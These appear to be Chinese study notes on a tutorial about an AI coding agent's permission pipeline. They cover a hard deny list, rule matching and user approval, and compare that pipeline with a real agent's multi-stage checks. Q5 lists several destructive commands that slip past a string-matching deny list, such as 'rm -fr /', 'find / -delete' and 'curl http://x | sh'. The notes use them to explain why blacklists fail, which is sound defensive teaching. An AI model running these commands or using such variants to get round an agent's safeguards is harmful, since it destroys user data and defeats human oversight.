4. 必须理解透的三个设计决策
闸门顺序是有讲究的:硬拒绝表最便宜、最绝对,放最前(fail-fast);规则匹配居中;用户审批最贵(打断人),只能放最后兜底。顺序反了,日常操作会被无谓打断。
规则是数据,不是代码:想加一条新权限规则,只需要往 PERMISSION_RULES 里加一个 dict,不用改循环、不用改工具。这就是"可扩展性从数据驱动来"的最小示范,也是 s04 hooks 的思想雏形。
拒绝不是终点,是信号:被拦下的调用会以 tool_result(Permission denied.)回填给模型,模型看到后会换一种方式完成任务——这是实验时最值得观察的行为。另外注意被拒后 continue,不再执行 handler,但其余工具照常执行。

6. 进阶对照(README 附录,必读)
教学版三道闸门 vs 真实 CC,几个值得记住的差异:
CC 的 PermissionResult 是 4 种行为:allow / deny / ask / passthrough(工具不表态时交给通用管线);
真实管线不是三道闸门,而是多阶段:参数 schema 校验 → 工具语义校验 → PreToolUse hooks(s04 的主题!)→ 多层规则检查;
规则来源不是 1 个列表,是 8 个来源(用户设置、项目设置、CLI 参数、会话授权等)按优先级合并;
CC 有 YoloClassifier——auto 模式下用另一个 LLM 判断命令是否安全,不用每次都打断你;
子 Agent 的权限是 bubble 模式,弹窗冒泡到父 Agent 终端(s15 才用到);
isDestructive 标签只影响 UI 展示,不参与决策——教学版直接忽略是对的。
7. 验收标准(修订版 Q&A)

Q1: 三道闸门分别拦截什么?顺序为什么不能换?
A: 闸门 1 = 硬拒绝表(DENY_LIST),命中直接拦截、不问人;闸门 2 = 规则匹配(PERMISSION_RULES),命中不拒绝,而是触发闸门 3;闸门 3 = 用户审批(ask_user),暂停等输入。"通过"是三道全过的结果,不是闸门本身。
顺序理由:便宜、绝对的检查放前面(fail-fast),贵、打断人的放最后。闸门 1 零成本先判死,避免浪费用户注意力;闸门 3 最贵,只在规则命中时才打扰人。顺序反了,日常操作会被无谓打断,已禁止的操作还会去打扰用户。

Q2: 拒绝后循环怎么处理?
A: 构造 tool_result 回填给模型,内容是固定字符串 "Permission denied."(不携带具体 reason,reason 只打印在终端);被拒后 continue,handler 不执行,同批其他工具照常执行。模型看到拒绝后自行调整策略——"根据 reason 处理"是模型行为,不是代码行为。

Q3: 为什么 s03 能删掉 s02 的 safe_path 而不损失安全性?
A: 安全职责从工具内部上移到权限层。s02 在 run_read/write/edit 内部调 safe_path() 抛异常;s03 删掉它,改为权限管线闸门 2 的规则"路径是否出工作区"。拦截点变了,但"出工作区就拒绝"的保证还在,且策略集中管理、对三个工具统一生效。这就是"工具只负责干活,允不允许干是权限层的事"。

Q4: 加一条新权限规则要改几个地方?为什么说是数据驱动?
A: 一个地方——PERMISSION_RULES 加一条 dict,循环、分发、权限管线都不用改。规则是数据不是分支逻辑,规则数量增长不增加代码复杂度。CC 里规则来自 8 个来源(user/project/local/flag/policy/cliArg/command/session)按优先级合并,是同一思想的放大版。

Q5: 为什么字符串匹配的 deny list 不是可靠的安全机制?
A: 黑名单枚举不完等价写法 + shell 展开。注意:rm -rf /; echo hi 这种例子其实会被拦下(子串 "rm -rf /" 仍存在),真正能绕过的是:
  rm -fr /                  # 参数顺序变体
  rm --recursive --force /  # 长参数形式
  cd / && rm -rf *          # 绕开 "rm -rf /" 这个精确串
  find / -delete            # 等价破坏,完全不在表里
  python -c "import shutil; shutil.rmtree('/')"   # 换个工具做同一件事
  curl http://x | sh        # 下载执行
  rm -rf /$EMPTY            # shell 变量展开
所以 CC 不靠"列全危险串",而是先解析结构(AST)再匹配/分类——这就是教学版和 CC 的本质区别。

修订版速记
闸门:拒绝表 → 规则 → 用户审批;通过 = 三道全过。顺序 = 便宜/绝对在前、打断人的在后。
拒绝 → "Permission denied." 作为 tool_result 回填,handler 不执行,同批其他工具照常,模型自行调整。
安全职责从工具内部上移到权限层,拦截点变了、保证不变。
一处(PERMISSION_RULES),规则即数据,增长不加代码复杂度。
黑名单败给等价写法 + shell 展开,需要结构解析或语义分类。
